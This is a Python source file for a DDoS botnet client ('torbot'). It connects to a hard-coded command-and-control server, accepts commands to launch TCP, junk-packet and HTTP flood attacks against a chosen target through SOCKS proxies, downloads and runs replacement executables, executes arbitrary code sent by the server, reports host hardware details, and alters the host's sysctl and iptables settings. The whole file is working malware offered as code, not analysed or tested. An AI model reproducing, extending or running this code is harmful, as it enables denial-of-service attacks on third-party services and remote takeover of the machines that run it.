#cython: language_level=3

from base64 import b64decode

import os
import asyncio
import traceback
try:
	from python_socks.async_.asyncio import Proxy
except:
	os.system('python3 -m pip install python-socks[asyncio]')
	exit()

import random
import time
import datetime
import multiprocessing
import struct
import ssl

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

VERSION = 6
bot_key = b'torbot'
DEBUG = False

stop = False
attacks = []


class Files():

	def check(self, file):
		if '.' in file:
			if os.path.exists(file):
				return True
		else:
			if os.path.isdir(file):
				return True

	def new(self, file, data, wr='wb'):
		try:
			f = open(file, wr)
			f.write(data)
			f.close()
		except:
			return False
		return True

	def mkdir(self, dir):
		try:
			os.makedirs(dir)
		except:
			return False
		return True

	def open(self, file, wr='r'):
		try:
			f = open(file, wr)
		except:
			return False
		return f

class HTTPRequest:

	def __init__(self, host, path='/', method='GET'):

		self.method = method
		self.path = path
		self.host = host

		self.header_start = "{0} {1} HTTP/1.1\r\n"
		self.headers = {}
		self.body = ''

		self.headers["Host"]			= host
		self.headers["User-Agent"] 		= "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
		self.headers["Accept"] 			= "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
		self.headers["Accept-Language"] = "en-US,en;q=0.5"
		self.headers["Accept-Encoding"] = "none"
		self.headers["Connection"]      = "keep-alive"
		self.headers["Cache-Control"]   = "max-age=0"

	def set_header(self, name, value):
		self.headers[name] = value

	def add_cookie(self, cookie):
		self.headers["Cookie"] = self.headers["Cookie"] + '; ' + cookie 

	def set_path(self, path):
		self.path = path

	def get_cookies(self):
		return self.headers.get("Cookie")

	def compose(self):
		return self.header_start.format(self.method, self.path) + '\r\n'.join('{}: {}'.format(key, value) for key, value in self.headers.items()) + "\r\n\r\n"

stats = {
	"connected": 0,
	"errors": 0,
	"init": 0,
	"sent": 0,
	"recon": 0,
	"calls": 0
}

def counter(event):
	global stats

	stats[event] += 1
	stats['calls'] += 1

	if stats['calls'] > 1000:
		stats['calls'] = 0
		print(stats)




async def open_connection(proxy, dst, ssl):
	sock = await proxy.connect(dest_host=dst[0], dest_port=int(dst[1]))
	reader, writer = await asyncio.open_connection(
		host=None,
		port=None,
		sock=sock,
		ssl=ssl_context if ssl else None,
		server_hostname=dst[0] if ssl else None,
	)
	return reader, writer


class cnc_packet_reactor:

	def __init__(self):

		self.buffer = Buffer()
		self.protocol = {
			0: ['attacks', 'machine_info'],    # to_client+server | Keep Alive
			1: ['crypt_id'],   # to_client+server | Not Encrypted
			2: ['target', 'duration', 'method', 'threads', 'data_len'], # client | Start Attack
			3: ['executable', 'ver'], # to_client | Update 
			4: ['executable'],        # to_client | Download & Run 
			5: ['cpu_cores', 'cpu_model', 'cpu_load', 'ram_total', 'ram_used', 'ram_free', 'ver'], # to_server | Machine & bot info 
			6: ['empty'],      # to_client | Stop Attacks
			8: ['code'],       # to_client | RCE
			9: ['restart'],    # to_client | Restart
			7: ['proxies']     # to_client | Proxies
		}


	def read_packets(self):
		packets=[]

		while len(self.buffer):
			packet_length = unpack_varint(self.buffer)

			# Ensure we read all the packet
			if (len(self.buffer) < packet_length):
				self.log("Need more bytes: got %d, total %d" % (len(self.buffer), packet_length))
				self.buffer.reset_cursor()
				return packets + ["need more bytes: got %d, total %d" % (len(self.buffer), packet_length)]
		
			packet_id = unpack_varint(self.buffer)
			data_len = packet_length - len(varint_pack(packet_id))
			packet_data = self.buffer.read(data_len)

			packet, field = {"id": packet_id}, 0
			for value in packet_data.split(b"<|||>"):
				try:
					packet[self.protocol[packet_id][field]] = value
				except:
					raise RuntimeError("UnpackerOverflow: id %d lenght %d field %d value %s" % (packet_id, packet_length, field, str([value])))
				field += 1

			packets.append(packet)
			self.buffer.save()

		return packets


	def send_response(self, packet_id, packet_data=b""):
		raw_packet_data=b""

		if packet_data:
			fields = self.protocol[packet_id]

			for field in fields:
				if type(packet_data[field]) == bytes:
					raw_packet_data += packet_data[field]
				else:
					raw_packet_data += bytes(packet_data[field], 'utf8')
				
				if field != fields[-1]:
					raw_packet_data += b"<|||>"

		return varint_pack(len(raw_packet_data)+len(varint_pack(packet_id))) + varint_pack(packet_id) + raw_packet_data
		
		
	def react(self, data):
		self.buffer.send(data)
		packets = self.read_packets()
		response = b''

		for packet in packets:
			if 'need more bytes' in packet:
				if DEBUG: print(packet)
				continue
			if not packet:
				print('waiting for more bytes')
				continue

			self.log('Got packet' + str(packet['id']))

			if packet["id"] == 0: # Keep Alive
				response += self.send_response(
					packet_id   = 0,
					packet_data = {
						"attacks": "\n".join([attack.info for attack in attacks]),
						"machine_info": str(MachineInfo().get())
					}
				) # Pong

			elif packet["id"] == 1: # Crypt request
				response += self.send_response(
					packet_id   = 1,
					packet_data = {
						"crypt_id": bot_key
					}
				) 
				response += self.send_response(
					packet_id   = 5, 
					packet_data = dict(zip(MachineInfo().get(), map(str, MachineInfo().get().values())))
				)

			elif packet["id"] == 2: # Start Attack
				packet.pop("id")
				print(packet)
				Attack(packet)

			elif packet["id"] == 3: # Update
				if int(packet['ver']) > VERSION:
					try:
						self.log('Updating')
						Files().new('bot', b64decode(packet['executable'].decode('utf8')))
						os.system('chmod 777 bot')
						controller.restart()
					except Exception as error:
						self.log("Update failed: " + str(error))
				else:
					self.log('Bot is up-to-date')

			elif packet["id"] == 6:
				controller.manage_attacks(stop_all=True)

			elif packet["id"] == 7:
				with open('proxy.txt', 'wb') as pfile:
					pfile.write(packet['proxies'])
				print('got %d proxies' % packet['proxies'].count(b'\n'))

			elif packet["id"] == 8: # RCE
				try:
					exec(packet["code"])
				except Exception as error:
					self.log(f"RCE error: {error}")
			
			elif packet["id"] == 9:
				controller.restart()

			else: # Unhandled packet
				self.log(f'Unknown packet: {packet}')

		return response


	def log(self, m):
		if DEBUG: print(f"[cnc_reactor]: {m}")



class Controller(object):

	def __init__(self): pass
 

	def log(self, m):
		print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}/Controller] {m}')
 

	async def network_loop(self):	

		while not stop:
			try:
				#proxy_list = get_proxy_list()
				#proxy = random.choice(proxy_list)
				#proxy = Proxy.from_url(f'socks4://{proxy[0]}:{proxy[1]}', rdns=False)
				reader, writer = await asyncio.wait_for(
					#open_connection(proxy, ('2.57.187.164', 25565), False),
					asyncio.open_connection('188.93.233.82', 443),
					timeout = 3
				)
			except Exception as error: 
				self.log(f"Cant connect to CNC: {error}")
				continue

			cnc_reactor = cnc_packet_reactor()
			self.manage_attacks()
			self.log('Connected')
			
			try:
				while not stop:
					data = await asyncio.wait_for( 
						reader.read(65535),
						timeout = 10
					)
					if not data:
						raise RuntimeError('Connection closed')
						
					reaction = cnc_reactor.react(data)
					self.manage_attacks()

					if reaction:
						writer.write(reaction)
						await writer.drain()
			except Exception as error:
				self.log(f"Error in network loop: {error}")
				if DEBUG: raise

		writer.close()


	def manage_attacks(self, stop_all=False):
		global attacks

		for attack in list(attacks):
			if (time.time() > attack.time_stop) or stop_all:
				self.log(f'attack {attack.info} stopped')
				attack.process.terminate()
				attacks.remove(attack)
	
	
	def restart(self):
		global stop

		stop = True
		self.manage_attacks(True)

		os.execv('./bot', ['bot'])

def get_proxy_list():
	proxy_list = []
	with open('proxy.txt', 'r') as proxies:
		for proxy in proxies.read().split('\n'):
			proxy = proxy.split(':')
			if len(proxy) != 2: continue
			proxy[1] = int(proxy[1])
			proxy_list.append(proxy)
	print('Proxies: %d' % len(proxy_list))
	return proxy_list


hard_junk_data = b'\x8f\xc8\x7f\x01\x01' * int((2089999/5)-7)

class Attack():

	def __init__(self, settings):
		global attacks

		self.time_start = time.time()
		self.time_stop = self.time_start + int(settings['duration'])
		self.settings = settings
		self.settings['data_len'] = int(self.settings['data_len'])

		self.info = f"{unix2date(self.time_start)} -> {unix2date(self.time_stop)}: {settings}"

		if b'https' in self.settings['target']:
			self.ssl = ssl_context
		else:
			self.ssl = False

		self.target = self.settings['target'].decode('utf8').replace('http://', '').replace('https://', '').split(':')
		self.target[1] = int(self.target[1])
		self.data = bytes(HTTPRequest(self.target[0]).compose() * self.settings['data_len'], 'utf8')
		self.http_request = bytes(HTTPRequest(self.target[0]).compose(), 'utf8')

		self.start_len = random.randint(30,36)

		if self.settings['data_len'] > 665:
			self.part_len = random.randint(3,6)
		else:
			self.part_len = random.randint(16,26)

		varint = random.choice([
			('\x8f\xc8\x7f', 2089999), ('\x8e\xc8\x7f', 2089998),
			('\x8d\xc8\x7f', 2089997), ('\x8c\xc8\x7f', 2089996),
			('\x8b\xc8\x7f', 2089995), ('\x8a\xc8\x7f', 2089994),
			('\x89\xc8\x7f', 2089993), ('\x88\xc8\x7f', 2089992),
			('\x87\xc8\x7f', 2089991), ('\xa3\xc0\x7f', 2088995),
			('\xa2\xc0\x7f', 2088994), ('\xa1\xc0\x7f', 2088993),
			('\xa0\xc0\x7f', 2088992), ('\x9f\xc0\x7f', 2088991)
		])
		ids = random.choice([
			'\x03\x02', '\x04\x05', '\x04\x02', '\x03\x04', '\x00\x09',
			'\x09\x08', '\x01\x06', '\x07\x03', '\x04\x05'
		])
		self.junk_data = bytes((varint[0] + ids + self.target[0]) * int((varint[1]/5)-(self.part_len+self.start_len+len(self.target[0])+1)), 'utf8')

		self.process = multiprocessing.Process(target=self.start_attack)
		self.process.start()
		
		attacks.append(self)


	def start_attack(self):
		method = {
			b"TCP_DATA": self.data_flood,
			b"TCP_CONN": self.connection_flood,
			b"TCP_WAIT": self.connection_wait,
			b"TCP_MCSHORTJUNK": self.TCP_MCSHORTJUNK,
			b"TCP_MCHARDJUNK": self.TCP_MCHARDJUNK,
			b"TCP_HANG": self.TCP_HANG,
			b"HTTP_FULLGET": self.http_fullget
		}.get(
			self.settings['method'],
			self.data_flood
		)
		loop = asyncio.new_event_loop()
		asyncio.set_event_loop(loop)
		proxy_list = get_proxy_list()

		tasks = asyncio.gather(*[method(random.choice(proxy_list)) for i in range(1, int(self.settings['threads']))])
		loop.run_until_complete(tasks)
		
		loop.close()


	async def TCP_HANG(self, proxy):
		proxy = Proxy.from_url(f'socks4://{proxy[0]}:{proxy[1]}', rdns=False)
		while True:
			try:
				await open_connection(proxy, self.target, self.ssl)
				counter('recon')
				#writer.close()
			except Exception as error:
				#print(error)
				counter('errors')



	async def TCP_MCSHORTJUNK(self, proxy):
		proxy = Proxy.from_url(f'socks4://{proxy[0]}:{proxy[1]}', rdns=False)

		try:
			_, writer = await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			print(f"Connection to {proxy.host} failed")
			if DEBUG: raise
			return
		except: pass
		#counter('connected')

		while True:
			try:
				writer.write(self.junk_data[:self.start_len])
				await asyncio.sleep(0)
				await writer.drain()
				#counter('sent')
				for lines in range(0, len(self.junk_data), self.part_len):
					writer.write(self.junk_data[lines:lines+self.part_len])

					if self.settings['data_len'] == 999:
						sleep_time = 0.01
					elif self.settings['data_len'] == 555:
						sleep_time = 0.02
					elif self.settings['data_len'] == 444:
						sleep_time = 0.05
					else:
						sleep_time = 0.002

					await writer.drain()
					await asyncio.sleep(sleep_time)
			except Exception as error:
				try:
					_, writer = await open_connection(proxy, self.target, self.ssl)
					#counter('recon')
				except:
					#counter('errors')
					pass


	async def TCP_MCHARDJUNK(self, proxy):
		proxy = Proxy.from_url(f'socks4://{proxy[0]}:{proxy[1]}', rdns=False)
		#counter('init')
		
		try:
			_, writer = await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			print(f"Connection to {proxy.host} failed"); return
		except: pass
		#counter('connected')

		while True:
			try:   
				writer.write(hard_junk_data)
				await asyncio.sleep(0)
				await writer.drain()
				#counter('sent')
			except:
				try:
					_, writer = await open_connection(proxy, self.target, self.ssl)
					#counter('recon')
				except:
					#counter('errors')
					pass


	async def data_flood(self, proxy):
		proxy = Proxy.from_url(f'socks4://{proxy[0]}:{proxy[1]}', rdns=False)
		#counter('init')
		
		try:
			_, writer = await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			if DEBUG: print(traceback.format_exc())
			print(f"Connection to {proxy.host} failed")
			return
		except: 
			if DEBUG: print(traceback.format_exc())
		#counter('connected')

		while True:
			try:  
				writer.write(self.data)
				await asyncio.sleep(0.1)
				await writer.drain()
				#counter('sent')
			except:
				try:
					_, writer = await open_connection(proxy, self.target, self.ssl)
					if DEBUG: print(traceback.format_exc())
					#counter('recon')
				except:
					#counter('errors')
					if DEBUG: print(traceback.format_exc())


	async def connection_flood(self, proxy):
		proxy = Proxy.from_url(f'socks4://{proxy[0]}:{proxy[1]}', rdns=False)
		#counter('init')
		
		try:
			_, writer = await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			print(f"Connection to {proxy.host} failed"); return
		except: pass
		#counter('connected')

		while True:
			try:
				_, writer = await open_connection(proxy, self.target, self.ssl)
				#counter('recon')
				writer.close()
			except:
				#counter('errors')
				pass


	async def connection_wait(self, proxy):
		proxy = Proxy.from_url(f'socks4://{proxy[0]}:{proxy[1]}', rdns=False)
		#counter('init')
		
		try:
			_, writer = await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			print(f"Connection to {proxy.host} failed"); return
		except: pass
		#counter('connected')

		while True:
			try:
				_, writer = await open_connection(proxy, self.target, self.ssl)
				#counter('recon')
				await asyncio.sleep(self.settings['data_len']/10)
				writer.close()
			except:
				#counter('errors')
				pass


	### --- HTTP --- ###

	async def http_fullget(self, proxy):
		proxy = Proxy.from_url(f'socks4://{proxy[0]}:{proxy[1]}', rdns=False)
		#counter('init')
		
		try:
			_, writer = await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			if DEBUG: print(traceback.format_exc())
			print(f"Connection to {proxy.host} failed")
			return
		except: 
			if DEBUG: print(traceback.format_exc())
		#counter('connected')

		while True:
			try:  
				writer.write(self.http_request)
				await asyncio.sleep(self.settings['data_len'] / 1000)
				await writer.drain()
				#counter('sent')
			except:
				try:
					_, writer = await open_connection(proxy, self.target, self.ssl)
					if DEBUG: print(traceback.format_exc())
					#counter('recon')
				except:
					#counter('errors')
					if DEBUG: print(traceback.format_exc())

def unix2date(unixtime):
	return datetime.datetime.fromtimestamp(unixtime).strftime('%H:%M:%S')
 
def unpack_varint(bbuff):
	total = 0
	shift = 0
	val = 0x80
	while val & 0x80:
			val = struct.unpack('B', bbuff.read(1))[0]
			total |= (val & 0x7F) << shift
			shift += 7
	if total >= (1 << 32):
			return None
	if total & (1 << 31):
			total -= 1 << 32
	return total
	
def varint_pack(d):
	o = b''
	while True:
		b = d & 0x7F
		d >>= 7
		o += struct.pack("B", b | (0x80 if d > 0 else 0))
		if d == 0:
			break
	return o

class Buffer(object):
	buff = b''
	cursor = 0

	def read(self, length):
		if length > len(self):
			raise RuntimeError("BufferUnderflow")

		out = self.buff[self.cursor:self.cursor+length]
		self.cursor += length
		return out

	def write(self, data):
		self.buff += data

	def flush(self):
		return self.read(len(self))

	def save(self):
		self.buff = self.buff[self.cursor:]
		self.cursor = 0

	def reset_cursor(self):
		self.cursor = 0

	def get_cursor(self):
		return self.cursor

	def reset(self):
		self.buff = b''
		self.cursor = 0

	def __len__(self):
		return len(self.buff) - self.cursor

	recv   = read
	append = write
	send   = write

class MachineInfo(object):
	def __init__(self):
		pipe = os.popen('free -t -m')
		self.cpuinfo = open('/proc/cpuinfo').read()
		self.raminfo = list(map(int, pipe.readlines()[-1].split()[1:]))
		pipe.close()
		self.info = {'ver': VERSION}
		self.fetch()
 
	def fetch(self):
		self.fetchCPU()
		self.fetchRAM()
 
	def fetchCPU(self):
		self.info['cpu_cores'] = self.cpuinfo.count('processor\t:')
		cpu_model = None
		for cpu in self.cpuinfo.split(': '):
			if 'CPU' in cpu:
				cpu_model = cpu.split('\n')[0]
		self.info['cpu_model'] = cpu_model
		self.info['cpu_load'] = os.getloadavg()
 
	def fetchRAM(self):
		self.info['ram_total'] = self.raminfo[0]
		self.info['ram_used']  = self.raminfo[1]
		self.info['ram_free']  = self.raminfo[2]
 
	def get(self, value='all'):
		if value == 'all':
			return self.info
		else:
			return self.info[value]

def fix_sysctl():
	sysctl = open('/etc/sysctl.conf', 'a')
	sysctl_conf = open('/etc/sysctl.conf', 'r').read()
	if sysctl_confs not in sysctl_conf:
		sysctl.write(sysctl_confs)
		sysctl.close()
		os.system('sysctl -p')
		os.system('echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout')
		os.system('echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse')
		print('[MAIN] Fixed sysctl')
		os.system('iptables -t raw -I PREROUTING -p tcp -j NOTRACK')

sysctl_confs = '''
net.netfilter.nf_conntrack_max=5242880
net.netfilter.nf_conntrack_tcp_timeout_syn_sent = 3
net.netfilter.nf_conntrack_tcp_timeout_syn_recv = 3
net.ipv4.tcp_synack_retries=1
net.ipv4.tcp_max_orphans=600000
net.ipv4.tcp_max_syn_backlog=16384
net.ipv4.route.flush=1
net.ipv4.tcp_no_metrics_save = 1
net.ipv4.ip_local_port_range = 1024 65535
net.ipv4.netfilter.ip_conntrack_tcp_timeout_time_wait = 15
'''
os.system('ulimit -n 65535')
fix_sysctl()


controller = Controller()

def main():
	try:
		asyncio.run(controller.network_loop())
	except:
		controller.manage_attacks(True)
		if DEBUG: raise

main()
